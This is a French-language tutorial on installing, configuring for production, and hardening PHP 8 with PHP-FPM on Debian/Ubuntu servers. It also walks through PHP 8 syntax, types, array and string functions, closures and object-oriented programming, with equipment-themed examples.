# PHP 8 — Le guide complet du sysadmin qui héberge

> **Public :** sysadmin / chef de service systèmes & énergies qui déploie, sécurise et maintient des applications PHP en production.
> **Version couverte :** PHP 8.1 → 8.4 sur Debian 12 / Ubuntu 22.04 / 24.04.
> **Objectif :** installer, configurer, sécuriser, superviser et dépanner PHP + PHP-FPM + nginx comme un pro, et écrire du PHP 8 propre.

---

## 1. Pourquoi ce guide

PHP fait tourner ~75 % du web (WordPress, GLPI, Nextcloud, Dolibarr, applications métier…). En tant que sysadmin, tu n'as pas forcément besoin d'écrire des frameworks : tu dois **installer proprement**, **configurer pour la production**, **sécuriser**, **superviser** et **dépanner** — et comprendre le code que tu héberges pour juger de sa qualité.

Ce guide couvre les deux versants :

| Versant | Contenu |
|---|---|
| **Hébergement** | Installation, `php.ini` prod, PHP-FPM + nginx, OPcache, logs, supervision, sauvegardes, mises à jour |
| **Langage** | Syntaxe PHP 8, types, POO, PDO, sécurité du code, formulaires, sessions, uploads |

**Conventions utilisées :**

- Les blocs `bash` = commandes à exécuter sur le serveur.
- Les blocs `php` = code PHP 8 valide (testé mentalement, pas de placeholder).
- ⚠️ = point de vigilance production. 🔒 = sécurité. 📋 = checklist.

---

## 2. Prérequis et environnement de travail

- Un serveur Debian 12 (Bookworm) ou Ubuntu 22.04/24.04 LTS, à jour :
  ```bash
  sudo apt update && sudo apt upgrade -y
  ```
- Accès root / sudo.
- nginx (ou Apache) — ce guide utilise **nginx + PHP-FPM** (recommandé en prod).
- MariaDB/MySQL ou PostgreSQL si l'appli utilise une base (sections PDO).
- Un éditeur : `nano`, `vim`, ou VS Code en SSH distant.

📋 **Checklist avant de commencer :**

- [ ] OS à jour (`apt upgrade`)
- [ ] Nom d'hôte et DNS configurés
- [ ] Pare-feu actif (UFW : 80/443 ouverts, 22 restreint)
- [ ] Sauvegarde existante avant toute modification
- [ ] Environnement de test/staging séparé de la prod si possible

---

## 3. Installation de PHP 8.x sur Debian/Ubuntu

Debian 12 embarque PHP 8.2, Ubuntu 24.04 embarque PHP 8.3. Pour les versions plus récentes (8.3/8.4 sur Debian 12, 8.4 sur Ubuntu 22.04), utilise le dépôt **Sury** (Ondřej Surý, mainteneur officiel des paquets PHP Debian) :

```bash
# 1. Dépendances pour ajouter un dépôt APT
sudo apt install -y lsb-release ca-certificates apt-transport-https software-properties-common gnupg

# 2. Clé GPG du dépôt Sury
sudo curl -fsSL https://packages.sury.org/php/apt.gpg -o /usr/share/keyrings/deb.sury.org-php.gpg

# 3. Ajout du dépôt
echo "deb [signed-by=/usr/share/keyrings/deb.sury.org-php.gpg] https://packages.sury.org/php/ $(lsb_release -sc) main" \
  | sudo tee /etc/apt/sources.list.d/php.list

# 4. Installation de PHP 8.4 + FPM + extensions courantes
sudo apt update
sudo apt install -y php8.4 php8.4-fpm php8.4-cli \
  php8.4-mysql php8.4-pgsql php8.4-sqlite3 \
  php8.4-curl php8.4-xml php8.4-mbstring php8.4-zip \
  php8.4-gd php8.4-intl php8.4-bcmath php8.4-gmp \
  php8.4-redis php8.4-opcache php8.4-readline
```

🔒 **N'installe que les extensions nécessaires.** Chaque extension = surface d'attaque et mémoire en plus. Adapte la liste à l'appli hébergée (ex. : pas de `php8.4-pgsql` si tu n'as que MySQL).

Vérification :

```bash
php -v            # version CLI
php -m            # modules chargés
php --ini         # fichiers ini lus (CLI)
```

> **Bon à savoir :** PHP existe en deux SAPI (interfaces) : **CLI** (ligne de commande, `php script.php`) et **FPM** (FastCGI, pour le web via nginx). Chacune a **son propre `php.ini`**. Ne confonds jamais les deux.

| SAPI | Binaire / service | Fichier ini (Debian) |
|---|---|---|
| CLI | `php` | `/etc/php/8.4/cli/php.ini` |
| FPM | `php8.4-fpm` (service) | `/etc/php/8.4/fpm/php.ini` |

---

## 4. Installation et premier démarrage de PHP-FPM

PHP-FPM (FastCGI Process Manager) est le SAPI recommandé pour servir PHP via nginx : pools de workers, gestion fine des processus, status temps réel.

```bash
# Le paquet php8.4-fpm installe et démarre le service
sudo systemctl enable --now php8.4-fpm
sudo systemctl status php8.4-fpm

# Socket Unix par défaut (à utiliser dans nginx) :
ls -l /run/php/php8.4-fpm.sock
```

Test de fonctionnement avec nginx (config complète section 56). Test rapide en CLI :

```bash
# Page d'info PHP en CLI (équivalent de phpinfo() web, sans exposer le web)
php -r 'phpinfo();' | head -40
```

⚠️ **Ne mets JAMAIS `phpinfo()` sur un site en production** : ça expose versions, chemins, variables d'environnement. En dev local uniquement.

---

## 5. Configuration php.ini pour la production

Deux fichiers à régler : `/etc/php/8.4/fpm/php.ini` (web) et `/etc/php/8.4/cli/php.ini` (CLI/cron). Après modification : `sudo systemctl reload php8.4-fpm`.

### 5.1 Réglages de sécurité (FPM — les plus importants)

```ini
; === EXPOSITION ===
expose_php = Off              ; ne pas envoyer "X-Powered-By: PHP/8.4" dans les en-têtes

; === ERREURS : jamais affichées au visiteur en prod ===
display_errors = Off
display_startup_errors = Off
log_errors = On
error_log = /var/log/php8.4-fpm-error.log
error_reporting = E_ALL       ; on loggue TOUT, on affiche RIEN

; === UPLOADS ===
file_uploads = On
upload_max_filesize = 10M     ; selon besoin métier (jamais plus que nécessaire)
max_file_uploads = 5

; === LIMITES RESSOURCES ===
max_execution_time = 30       ; 30 s max par requête web (CLI : 0 = illimité)
max_input_time = 30
memory_limit = 256M           ; par worker ; x N workers = RAM totale à prévoir
post_max_size = 12M           ; > upload_max_filesize (marge pour les champs du form)
max_input_vars = 2000         ; protection contre les attaques par saturation

; === SESSIONS (voir section 40) ===
session.cookie_httponly = 1
session.cookie_secure = 1     ; HTTPS uniquement (si le site est en HTTPS, ce qui est obligatoire)
session.cookie_samesite = "Lax"
session.use_strict_mode = 1
session.use_only_cookies = 1

; === DIVERS ===
allow_url_fopen = Off         ; bloque file_get_contents("http://...") sauf besoin explicite
allow_url_include = Off        ; TOUJOURS Off (inclusion de code distant = faille critique)
default_charset = "UTF-8"
date.timezone = "Europe/Paris" ; ou la TZ du serveur ; évite les warnings DateTime
```

### 5.2 Différences CLI

```ini
; /etc/php/8.4/cli/php.ini
max_execution_time = 0   ; pas de limite pour les scripts longs (imports, crons)
memory_limit = 512M      ; les batchs consomment plus
log_errors = On
```

### 5.3 Vérifier la config effective

```bash
php -i | grep -E "^(expose_php|display_errors|memory_limit|upload_max_filesize)"
# ou, ciblé :
php -r 'echo ini_get("memory_limit"), PHP_EOL;'
```

📋 **Checklist php.ini prod :** `expose_php=Off`, `display_errors=Off`, `log_errors=On`, `allow_url_include=Off`, cookies de session durcis, `memory_limit` cohérent avec la RAM, `upload_max_filesize` au besoin strict.

---

## 6. PHP en ligne de commande (CLI)

Le CLI sert pour les crons, les scripts d'import, Composer, les tests.

```bash
php -v                          # version
php -l script.php                # vérifie la SYNTAXE sans exécuter (lint) — indispensable avant déploiement
php script.php arg1 arg2         # exécution avec arguments ($argv)
php -r 'echo "hello\n";'         # one-liner
php -a                           # shell interactif (pratique pour tester une fonction)
```

Récupérer les arguments :

```php
<?php
// script.php appelé via : php script.php import --force
var_dump($argv);   // [0 => 'script.php', 1 => 'import', 2 => '--force']
var_dump($argc);   // 3
```

🔒 **Permissions :** un script PHP CLI lancé par cron doit avoir les droits minimaux (propriétaire dédié, jamais root sauf nécessité absolue). Les scripts web (`/var/www/...`) ne doivent **jamais** être exécutables en écriture par l'utilisateur FPM.

---

## 7. Syntaxe de base

```php
<?php
// Tout fichier PHP commence par <?php (jamais la balise courte <? seule en prod)

declare(strict_types=1); // voir section 9 — à mettre en tête des fichiers applicatifs

echo "Bonjour Zelef\n";          // affiche + retour ligne
print "Bonjour\n";               // équivalent (retourne 1)

$nom = "Monde";                  // variable : $ + nom
echo "Bonjour $nom\n";           // interpolation dans les doubles quotes
echo 'Bonjour ' . $nom . "\n";   // concaténation avec le point .

// Commentaires : // ligne, # ligne, /* bloc */ , /** docblock */

/*
 * Commentaire sur
 * plusieurs lignes
 */
```

**Règles de nommage :**

| Élément | Convention |
|---|---|
| Variables, fonctions, méthodes | `camelCase` : `$dateDebut`, `calculerTotal()` |
| Classes, interfaces, traits, enums | `PascalCase` : `FactureClient` |
| Constantes | `MAJUSCULES_SNAKE` : `TAUX_TVA` |

Ferme la balise `?>` ? **Non** : dans un fichier 100 % PHP, on **omet** la balise fermante pour éviter tout caractère parasite (espace, BOM) qui casserait les en-têtes HTTP (`headers already sent`).

---

## 8. Les types en PHP 8

PHP est à typage **dynamique** mais supporte un typage **strict et complet** depuis PHP 7/8. En 2026, on type tout.

```php
<?php declare(strict_types=1);

// --- Scalaires ---
$entier   = 42;            // int
$flottant = 19.99;         // float
$texte    = "câble";       // string
$vrai     = true;          // bool

// --- Composés ---
$tableau  = [1, 2, 3];     // array
$objet    = new DateTime();// object

// --- Spéciaux ---
$nulle    = null;          // null
$callable = 'strlen';      // callable (nom de fonction, closure, [obj, méthode])

// --- Types du système de typage (déclarations) ---
function demo(
    int $a,                 // scalaire
    ?string $b,             // nullable (? = null autorisé)
    array $c,               // tableau
    int|float $d,           // union de types (PHP 8.0)
    mixed $e,               // tout type (PHP 8.0)
    callable $f,            // appelable
): int|string {             // type de retour (union)
    return $a;
}

// Types spéciaux de retour :
function neRevientJamais(): never { throw new Exception("stop"); } // PHP 8.1 : ne retourne jamais
```

**Conversions (cast) :**

```php
$x = (int) "42abc";    // 42 (PHP tronque, ne pas abuser)
$y = (float) "19.99";  // 19.99
$z = (bool) "";        // false — "" , "0", 0, 0.0, [], null sont falsy
$s = (string) 42;      // "42"
$a = (array) "x";      // ["x"]
```

⚠️ **Piège classique :** `==` compare avec conversion de type (`"42" == 42` → `true`), `===` compare type + valeur (`"42" === 42` → `false`). **En PHP 8, utilise `===` par défaut.**

---

## 9. `declare(strict_types=1)` — le mode strict

Par défaut, PHP convertit silencieusement les types scalaires à l'appel des fonctions typées (mode **coercitif**) :

```php
<?php
// SANS strict_types :
function addition(int $a, int $b): int { return $a + $b; }
echo addition("2", "3");   // 5 — "2" converti en 2 sans prévenir
```

Avec `declare(strict_types=1);` en **première ligne** du fichier appelant, toute incohérence lève une `TypeError` :

```php
<?php declare(strict_types=1);

function addition(int $a, int $b): int { return $a + $b; }

echo addition("2", "3");
// TypeError: addition(): Argument #1 ($a) must be of type int, string given
```

**Règles :**

- Le `declare` s'applique au **fichier où se trouve l'appel**, pas où la fonction est définie.
- Il doit être la **toute première instruction** du fichier (avant tout code, après `<?php`).
- À mettre systématiquement dans ton code applicatif. Les libs externes gèrent leur propre fichier.

🔒 Le mode strict élimine toute une classe de bugs silencieux (dates, montants, IDs passés en string). **Non négociable dans du code neuf.**

---

## 10. Variables, constantes, portée

```php
<?php declare(strict_types=1);

// --- Variables ---
$compteur = 0;
$compteur += 5;                 // opérateurs combinés : += -= *= /= .= %= **=
$nomComplet = $prenom . ' ' . $nom;

// --- Constantes : define() ou const (préféré dans les classes) ---
define('SEUIL_ALERTE', 80);     // globale, partout
const DOSSIER_LOGS = '/var/log/appli'; // au niveau fichier ou classe

echo SEUIL_ALERTE;

// --- Constantes magiques ---
echo __FILE__;   // chemin du fichier courant
echo __DIR__;    // dossier du fichier courant (préféré à dirname(__FILE__))
echo __LINE__;   // numéro de ligne
echo __FUNCTION__, __CLASS__, __METHOD__;

// --- Portée : les fonctions ne voient PAS les variables globales ---
$taxe = 0.20;
function prixTTC(float $ht): float {
    // echo $taxe; // ERREUR : undefined variable
    global $taxe;              // ❌ à éviter
    return $ht * (1 + $taxe);
}
// ✅ Bien : passer en paramètre
function prixTtcPropre(float $ht, float $taux): float {
    return $ht * (1 + $taux);
}

// --- Variables statiques : conservent leur valeur entre appels ---
function compteurAppels(): int {
    static $n = 0;   // initialisée une seule fois
    return ++$n;
}
echo compteurAppels(); // 1
echo compteurAppels(); // 2

// --- Variables variables (à connaître, à éviter) ---
$cle = 'nom';
$$cle = 'Zelef';   // crée $nom = 'Zelef' — obscur, banni des revues de code
```

---

## 11. Les superglobales

Accessibles partout, sans `global`. **Toutes les données venant de l'utilisateur sont hostiles** : `$_GET`, `$_POST`, `$_COOKIE`, `$_FILES`, `$_REQUEST` = à valider systématiquement (sections 38, 48-50).

```php
<?php
$_GET      // paramètres d'URL : page.php?id=42  → $_GET['id']
$_POST     // corps des formulaires POST
$_COOKIE   // cookies envoyés par le navigateur
$_FILES    // fichiers uploadés (structure spéciale, voir section 43)
$_SERVER   // infos serveur/requête : $_SERVER['REQUEST_METHOD'], ['REMOTE_ADDR'], ['HTTP_HOST']...
$_SESSION  // session (après session_start())
$_ENV      // variables d'environnement
$GLOBALS   // toutes les variables globales

// Exemples sûrs :
$methode = $_SERVER['REQUEST_METHOD'] ?? 'GET';   // ?? = null coalescent
$ip      = $_SERVER['REMOTE_ADDR'] ?? 'inconnue';
$hote    = $_SERVER['HTTP_HOST'] ?? '';

// ⚠️ $_REQUEST fusionne GET+POST+COOKIE : ordre configurable, source ambiguë.
// Préfère $_GET / $_POST explicites. Ne JAMAIS utiliser $_REQUEST en prod.
```

**Opérateur null coalescent `??` et assignation `??=` :**

```php
$page  = $_GET['page'] ?? 1;          // 1 si absent ou null
$tri   = $_GET['tri'] ?? $_POST['tri'] ?? 'date';  // chaînage
$config['debug'] ??= false;           // assigne seulement si null/absent
```

---

## 12. Opérateurs — l'essentiel et les pièges

```php
<?php declare(strict_types=1);

// --- Arithmétiques : + - * / % ** (puissance) ---
$reste = 10 % 3;      // 1
$carre = 4 ** 2;       // 16

// --- Comparaison : === !== == != <=> ??
$a = "42";
var_dump($a == 42);    // true  (conversion)
var_dump($a === 42);   // false (type différent) ✅ préféré
var_dump(3 <=> 5);     // -1 (spaceship : -1, 0 ou 1) — idéal pour usort

// --- Logiques : && || ! (et : and or xor, priorité différente — préfère && ||) ---
if ($connecte && $admin) { /* ... */ }

// --- Ternaire et Elvis ---
$role = $estAdmin ? 'admin' : 'user';
$nom  = $saisie ?: 'anonyme';   // ?: = $saisie si truthy, sinon 'anonyme'

// --- Chaînes ---
echo "Il est " . date('H:i');   // concaténation avec .

// --- Incrémentation ---
$i = 0; $i++; ++$i; $i--; --$i;

// --- Opérateur de contrôle d'erreur @ : À BANNIR ---
// $x = @file_get_contents($url); // ❌ masque les erreurs, ralentit, rend le debug impossible
// ✅ :
$contenu = file_get_contents($url);
if ($contenu === false) { /* gérer l'erreur */ }
```

| Priorité à connaître | Exemple correct |
|---|---|
| `&&` prioritaire sur `and` | `$ok = $a && $b;` (pas `$ok = $a and $b;` qui assigne d'abord !) |
| `.` et `+` : même niveau, associatif gauche | `'total: ' . $a + $b` → **piège** : parenthèse ! `('total: ' . ($a + $b))` |
| `??` basse priorité à droite | `$x = $a ?? $b;` OK |


---

## 13. Structures de contrôle : if, switch, match

```php
<?php declare(strict_types=1);

// --- if / elseif / else : accolades OBLIGATOIRES (même pour une ligne) ---
$charge = 82.5;
if ($charge >= 90) {
    $niveau = 'critique';
} elseif ($charge >= 70) {
    $niveau = 'alerte';
} else {
    $niveau = 'ok';
}

// --- switch : utile pour de nombreuses valeurs discrètes ---
$code = 'C6000';
switch ($code) {
    case 'C6000':
    case 'C6020':
        $action = 'vérifier le four';
        break;
    case 'C0640':
        $action = 'vérifier le disque dur';
        break;
    default:
        $action = 'code inconnu';
}
// ⚠️ Ne pas oublier break : sinon ça "tombe" dans le case suivant (fall-through).

// --- match (PHP 8.0) : expression, comparaison STRICTE (===), pas de break ---
$action = match ($code) {
    'C6000', 'C6020' => 'vérifier le four',
    'C0640'          => 'vérifier le disque dur',
    default          => 'code inconnu',
};
// match retourne une valeur et lève UnhandledMatchError si aucun bras ne correspond
// (sans default). Préfère match à switch dans le code neuf.
```

---

## 14. Boucles : for, foreach, while

```php
<?php declare(strict_types=1);

// --- foreach : LA boucle à utiliser sur les tableaux ---
$onduleurs = ['Eaton 9PX', 'APC SRT', 'Vertiv Liebert'];
foreach ($onduleurs as $index => $nom) {
    echo "$index : $nom\n";
}

// Modification par référence (avec & — attention à unset après !)
$puissances = [10, 20, 40];
foreach ($puissances as &$p) {
    $p *= 1000;   // passe en VA
}
unset($p);        // ⚠️ OBLIGATOIRE : sinon $p reste une référence piégeuse

// --- for : quand l'index compte ---
for ($i = 0; $i < 5; $i++) {
    echo "itération $i\n";
}

// --- while / do...while ---
$tentatives = 0;
while ($tentatives < 3) {
    $tentatives++;
    // ...
}

// --- break / continue ---
foreach ($fichiers as $f) {
    if ($f === '.') { continue; }          // passe au suivant
    if ($f === 'stop.txt') { break; }      // sort de la boucle
    if (str_ends_with($f, '.log')) { break 2; } // break 2 = sort de 2 niveaux (boucles imbriquées)
}
```

---

## 15. Les tableaux — création et manipulation

```php
<?php declare(strict_types=1);

// --- Création (syntaxe courte [] — toujours) ---
$vide    = [];
$notes   = [12, 15, 9];
$serveur = [
    'hostname' => 'srv-web-01',
    'ip'       => '10.0.0.11',
    'role'     => 'web',
];

// --- Accès ---
echo $serveur['hostname'];          // srv-web-01
echo $serveur['absent'] ?? 'n/a';   // ?? évite le warning "undefined array key"

// --- Ajout ---
$notes[] = 18;                      // ajoute à la fin
$serveur['os'] = 'Debian 12';       // nouvelle clé

// --- Suppression ---
unset($notes[1]);                   // supprime l'élément (les clés numériques ne sont PAS réindexées)
$notes = array_values($notes);      // réindexe 0..n

// --- Compter / tester ---
count($notes);                      // nombre d'éléments
isset($serveur['ip']);               // true si existe ET non null
array_key_exists('ip', $serveur);    // true même si valeur null
empty($vide);                       // true si vide / falsy
in_array('web', $serveur, true);    // ⚠️ true en 3e arg = comparaison stricte

// --- Déstructuration (list) ---
[$premier, $deuxieme] = $notes;
['hostname' => $h, 'ip' => $ip] = $serveur;  // déstructuration par clés (PHP 7.1+)

// --- Spread operator ---
$tous = [...$notes, ...[20, 21]];    // fusion (PHP 7.4+)
$config = [...$defauts, ...$specifiques]; // les clés string de droite écrasent celles de gauche
```

---

## 16. Fonctions sur tableaux — la boîte à outils

Le sysadmin manipule des listes (fichiers, lignes de log, équipements) : ces fonctions sont quotidiennes.

```php
<?php declare(strict_types=1);

$logs = [
    ['niveau' => 'info',    'msg' => 'démarrage'],
    ['niveau' => 'erreur',  'msg' => 'disque plein'],
    ['niveau' => 'info',    'msg' => 'backup ok'],
    ['niveau' => 'erreur',  'msg' => 'timeout bdd'],
];

// --- array_map : transforme chaque élément ---
$niveaux = array_map(fn(array $l): string => $l['niveau'], $logs);
// ['info', 'erreur', 'info', 'erreur']

// --- array_filter : garde ceux qui satisfont le test ---
$erreurs = array_filter($logs, fn(array $l): bool => $l['niveau'] === 'erreur');
$erreurs = array_values($erreurs); // réindexer après un filter

// --- array_reduce : réduit à une valeur (comptage, somme...) ---
$nbErreurs = array_reduce($logs, fn(int $n, array $l): int => $n + ($l['niveau'] === 'erreur' ? 1 : 0), 0);

// --- array_column : extrait une colonne ---
$messages = array_column($logs, 'msg');
// --- array_column avec clé d'index ---
$parNiveau = array_column($logs, 'msg', 'niveau');

// --- Tri ---
sort($notes);                 // valeurs croissantes (réindexe)
rsort($notes);                // décroissant
asort($notes);                // croissant en conservant les clés
ksort($serveur);              // tri par clé
usort($logs, fn($a, $b) => $a['msg'] <=> $b['msg']); // tri personnalisé (spaceship)

// --- Recherche ---
$cles = array_keys($serveur);            // ['hostname', 'ip', 'role']
$vals = array_values($serveur);
array_search('10.0.0.11', $serveur, true); // retourne la clé ou false (strict !)

// --- Ensembles ---
$fusion   = array_merge($a, $b);   // concatène (clés string de $b écrasent)
$communs  = array_intersect($a, $b);
$diff     = array_diff($a, $b);    // dans $a mais pas dans $b
$uniques  = array_unique($liste);

// --- Découpage ---
$premiers = array_slice($logs, 0, 10);            // 10 premiers
$pages    = array_chunk($logs, 50);               // découpe en paquets de 50 (pagination !)
[$ok, $ko] = [array_filter(...), array_filter(...)]; // séparer en deux groupes

// --- Clés/valeurs ---
$inverse  = array_flip(['a' => 1, 'b' => 2]); // [1 => 'a', 2 => 'b']
$rempli   = array_fill_keys(['lundi', 'mardi'], 0); // initialise un compteur par jour
$combine  = array_combine($cles, $vals);       // construit un tableau clé => valeur
```

📋 **Mémo express :** transformer → `array_map`, filtrer → `array_filter`, agréger → `array_reduce`, colonne → `array_column`, tri custom → `usort` + `<=>`, paginer → `array_chunk`.

---

## 17. Chaînes de caractères

```php
<?php declare(strict_types=1);

// --- Guillemets ---
$nom = 'Zelef';
$a = "Bonjour $nom, il est " . date('H:i');  // doubles quotes : interpolation + séquences \n \t
$b = 'Bonjour $nom';                          // simples quotes : LITTÉRAL (affiche $nom)
$c = 'C:\Windows\System32';                   // simples quotes : \ non interprété (sauf \' et \\)

// --- Heredoc / Nowdoc (textes multilignes : templates, SQL, mails) ---
$mail = <<<TEXTE
Bonjour $nom,

L'intervention sur l'onduleur est planifiée.
Cordialement,
TEXTE;   // heredoc : interpolation active, le marqueur final doit être en début de ligne (ou indenté, PHP 7.3+)

$sql = <<<'SQL'
SELECT * FROM interventions WHERE statut = 'planifiee'
SQL;     // nowdoc (quotes autour du marqueur) : AUCUNE interpolation — idéal pour SQL/regex

// --- Longueur : TOUJOURS mb_strlen en UTF-8 ---
$ville = "Hébergeur";
strlen($ville);      // 10 octets ❌
mb_strlen($ville);   // 9 caractères ✅

// --- Concaténer proprement ---
$ligne = sprintf("Serveur %s : charge %d%%", $hostname, $charge); // formaté
```

---

## 18. Fonctions sur chaînes — référence

```php
<?php declare(strict_types=1);

$s = "  Rapport d'intervention N°42  ";

// --- Nettoyage ---
trim($s);                    // supprime espaces début/fin
ltrim($s); rtrim($s, "/");   // un côté ; rtrim($url, "/") pour normaliser les URL

// --- Recherche (strpos retourne la POSITION ou false — comparer avec ===) ---
$pos = strpos($s, "intervention");
if ($pos !== false) { /* trouvé */ }           // ⚠️ !== false, pas juste if ($pos) (position 0 = falsy !)
str_contains($s, "42");                        // PHP 8 : true/false — PRÉFÉRÉ à strpos pour un simple test
str_starts_with($s, "  Rapport");              // PHP 8
str_ends_with($fichier, ".log");               // PHP 8

// --- Extraction / remplacement ---
substr($s, 2, 8);                              // sous-chaîne
str_replace("42", "43", $s);                   // remplace (sensible à la casse)
str_ireplace("rapport", "compte-rendu", $s);   // insensible à la casse
explode(",", "a,b,c");                         // string → tableau
implode(",", ["a", "b", "c"]);                 // tableau → string ("a,b,c")

// --- Casse ---
strtolower($s); strtoupper($s);
ucfirst("bonjour");        // "Bonjour"
mb_strtolower($s, 'UTF-8');// version multibyte (accents)

// --- Padding / répétition ---
str_pad("42", 5, "0", STR_PAD_LEFT);  // "00042" (numéros d'intervention)
str_repeat("-", 40);                   // ligne de séparation

// --- HTML (sécurité, voir section 49) ---
htmlspecialchars($saisie, ENT_QUOTES, 'UTF-8'); // échappe < > & " ' — ANTI-XSS
strip_tags($html);                              // supprime les balises (brutal, à éviter seul)

// --- Comparaison ---
strcmp($a, $b);            // binaire, sensible à la casse (<0, 0, >0)
strcasecmp($a, $b);        // insensible à la casse
$a === $b;                 // ✅ le plus simple pour l'égalité exacte
```

---

## 19. Déclarer des fonctions — typage complet

```php
<?php declare(strict_types=1);

// --- Fonction typée : paramètres + retour ---
function calculerAutonomie(float $capaciteAh, float $tensionV, float $chargeW): float
{
    if ($chargeW <= 0) {
        throw new InvalidArgumentException("La charge doit être positive");
    }
    return ($capaciteAh * $tensionV) / $chargeW; // heures
}

// --- Paramètres optionnels (valeur par défaut) ---
function formaterDuree(int $minutes, string $format = '%dh %02dmin'): string
{
    return sprintf($format, intdiv($minutes, 60), $minutes % 60);
}

// --- Arguments nommés (PHP 8.0) : clarté à l'appel ---
formaterDuree(minutes: 135);                    // "2h 15min"
formaterDuree(minutes: 135, format: '%d heures'); // ordre libre

// --- Retour nullable / void ---
function trouverServeur(string $ip): ?array  // ?array = array|null
{
    // ...
    return null; // ou un tableau
}

function logger(string $message): void  // ne retourne rien (même pas null implicite exploitable)
{
    file_put_contents('/var/log/appli.log', date('c') . " $message\n", FILE_APPEND);
}
```

**Règles d'or :** une fonction = **une** responsabilité, nom **verbe** explicite (`validerEmail`, pas `check`), typer **tous** les paramètres et le retour, **jamais** de `echo` dans une fonction métier (elle retourne, l'appelant affiche).

---

## 20. Closures et arrow functions

```php
<?php declare(strict_types=1);

// --- Closure classique : capture avec use ---
$seuil = 80;
$alerte = function (float $charge) use ($seuil): bool {
    return $charge >= $seuil;
};
var_dump($alerte(85.0)); // true

// --- Arrow function (PHP 7.4) : capture AUTOMATIQUE par valeur, une seule expression ---
$niveaux = ['info', 'erreur', 'info'];
$estErreur = fn(string $n): bool => $n === 'erreur';
$erreurs = array_filter($niveaux, $estErreur);

// Enchaîné avec array_map :
$hostnames = array_map(fn(array $s): string => $s['hostname'], $serveurs);

// --- Callable stocké et invoqué ---
$traitements = [
    'majuscules' => fn(string $s): string => mb_strtoupper($s, 'UTF-8'),
    'trim'       => fn(string $s): string => trim($s),
];
echo $traitements['trim']("  abc  "); // "abc"

// --- Fonction variadique : nombre d'arguments variable ---
function somme(float ...$nombres): float
{
    return array_sum($nombres);
}
echo somme(1.5, 2.5, 3.0); // 7.0
```

---

## 21. Fonctions utilitaires du quotidien sysadmin

```php
<?php declare(strict_types=1);

// --- Fichiers ---
file_get_contents('/etc/hostname');                    // lit tout un fichier
file_put_contents('/tmp/test.txt', "ligne\n", FILE_APPEND | LOCK_EX); // écrit (LOCK_EX = verrou)
file_exists('/var/www/app/.env');                      // existe ?
is_readable($chemin); is_writable($chemin); is_dir($chemin);
unlink($fichier);                                      // supprime
rename($ancien, $nouveau);                             // déplace/renomme
filesize($fichier); filemtime($fichier);               // taille, date modif
$lignes = file('/var/log/syslog', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES); // fichier → tableau de lignes
glob('/var/log/*.log');                                // liste les fichiers par motif

// --- JSON (API, configs) ---
$json = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_THROW_ON_ERROR);
$data = json_decode($json, true, 512, JSON_THROW_ON_ERROR); // true = tableau associatif
// ⚠️ JSON_THROW_ON_ERROR (PHP 7.3+) : lève une exception au lieu de retourner null silencieusement

// --- Divers ---
sleep(2);                    // pause en secondes (scripts CLI)
uniqid('job_', true);         // identifiant unique
random_int(1000, 9999);       // aléatoire CRYPTOGRAPHIQUEMENT sûr (pas rand() !)
var_dump($x);                // debug : type + valeur
print_r($x, true);            // debug : retourne au lieu d'afficher (pour logger)
gettype($x);                 // "integer", "string"...
```

🔒 `random_int()` pour tout ce qui touche à la sécurité (tokens, OTP). `rand()`/`mt_rand()` sont prédictibles : **interdits** pour les tokens (voir CSRF section 50).

---

## 22. POO : les classes — bases

```php
<?php declare(strict_types=1);

// --- Classe simple avec propriétés typées ---
class Onduleur
{
    public string $marque;
    public float $puissanceKva;
    private float $chargePct = 0.0;          // privée : accès via méthodes
    protected string $numeroSerie;           // protégée : classe + enfants

    // --- Constructeur ---
    public function __construct(string $marque, float $puissanceKva, string $numeroSerie)
    {
        $this->marque = $marque;
        $this->puissanceKva = $puissanceKva;
        $this->numeroSerie = $numeroSerie;
    }

    // --- Méthode ---
    public function definirCharge(float $pct): void
    {
        if ($pct < 0 || $pct > 100) {
            throw new InvalidArgumentException("Charge entre 0 et 100");
        }
        $this->chargePct = $pct;
    }

    public function puissanceRestanteKw(): float
    {
        return $this->puissanceKva * 0.9 * (1 - $this->chargePct / 100);
    }

    // --- Getter (lecture contrôlée d'une propriété privée) ---
    public function getCharge(): float
    {
        return $this->chargePct;
    }
}

$ups = new Onduleur('Eaton', 20.0, 'SN-8842');
$ups->definirCharge(65.0);
echo $ups->puissanceRestanteKw(); // 6.3
// echo $ups->chargePct; // ERREUR : propriété privée
```

---

## 23. Constructeurs modernes : promotion et readonly

```php
<?php declare(strict_types=1);

// --- Promotion des propriétés (PHP 8.0) : fini le $this->x = $x répétitif ---
class Intervention
{
    public function __construct(
        public int $id,
        public string $site,
        public DateTimeImmutable $date,
        private string $statut = 'planifiee',  // valeur par défaut possible
    ) {}
}

$inter = new Intervention(42, 'Datacenter A', new DateTimeImmutable('2026-10-01'));
echo $inter->site; // "Datacenter A"

// --- readonly (PHP 8.1) : propriété assignée UNE fois (au constructeur), puis immuable ---
class ConfigServeur
{
    public function __construct(
        public readonly string $hostname,
        public readonly string $ip,
    ) {}
}

$cfg = new ConfigServeur('srv-web-01', '10.0.0.11');
// $cfg->ip = '10.0.0.99'; // ERREUR : Cannot modify readonly property

// --- Constantes de classe ---
class NiveauAlerte
{
    public const INFO = 'info';
    public const CRITIQUE = 'critique';
}
echo NiveauAlerte::CRITIQUE;

// --- Membres statiques : compteur partagé par toutes les instances ---
class CompteurRequetes
{
    private static int $total = 0;

    public static function incrementer(): void
    {
        self::$total++;
    }

    public static function getTotal(): int
    {
        return self::$total;
    }
}
CompteurRequetes::incrementer();
```

---

## 24. Héritage, classes abstraites, méthodes

```php
<?php declare(strict_types=1);

// --- Classe abstraite : ne s'instancie pas, définit un contrat partiel ---
abstract class Equipement
{
    public function __construct(
        protected string $reference,
        protected string $emplacement,
    ) {}

    abstract public function getType(): string;  // chaque enfant DOIT l'implémenter

    public function etiquette(): string          // méthode concrète partagée
    {
        return "[{$this->getType()}] {$this->reference} @ {$this->emplacement}";
    }

    final public function getReference(): string // final = non surchargeable
    {
        return $this->reference;
    }
}

class Onduleur extends Equipement
{
    public function __construct(string $reference, string $emplacement, private float $puissanceKva)
    {
        parent::__construct($reference, $emplacement); // appel du constructeur parent
    }

    public function getType(): string
    {
        return 'onduleur';
    }

    public function etiquette(): string  // surcharge (override)
    {
        return parent::etiquette() . " ({$this->puissanceKva} kVA)";
    }
}

$ups = new Onduleur('EATON-9PX-20K', 'Local TGBT', 20.0);
echo $ups->etiquette(); // [onduleur] EATON-9PX-20K @ Local TGBT (20 kVA)
